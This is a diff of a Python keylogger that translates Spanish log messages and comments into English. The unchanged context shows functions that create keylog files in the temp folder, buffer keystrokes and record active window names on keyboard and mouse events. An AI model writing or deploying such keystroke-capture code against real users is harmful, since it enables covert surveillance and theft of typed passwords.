@@ -266,7 +266,7 @@ def delete_keylog_tempfile(pattern = None):
 
     folder_files = tempfile.gettempdir() + "\\" + pattern
     for file_remove in glob.glob(folder_files):
-        logging.debug('Borrando fichero temporal: ' + file_remove)
+        logging.debug('Delete Temporal file: ' + file_remove)
         os.remove(file_remove)
 
     return
@@ -279,7 +279,7 @@ def create_keylog_file():
     # crea fichero de keylog en la carpeta temporal del usuario
     prefix = KLGPRE + datetime.datetime.now().strftime("%y%m%d%H%M")
     ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
-    logging.debug('Creaf fichero keylogger ' + keylog_name)
+    logging.debug('Create keylogger file ' + keylog_name)
     f = open(keylog_name, 'w+')
     f.close()
 
@@ -360,7 +360,7 @@ def add_key_to_buffer(event):
 def on_mouse_event(event):
     global old_event
 
-    # si cambia ventana la registra
+    # si el usuario cambia de ventana, la registra
     if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
         register_window_name(repr(event.WindowName))
 
@@ -390,7 +390,7 @@ def on_keyboard_event(event):
         key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
         sys.exit(0)
 
-    # si cambia entana la registra
+    # si el usuario cambia de ventana, la registra
     if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
         register_window_name(repr(event.WindowName))
 
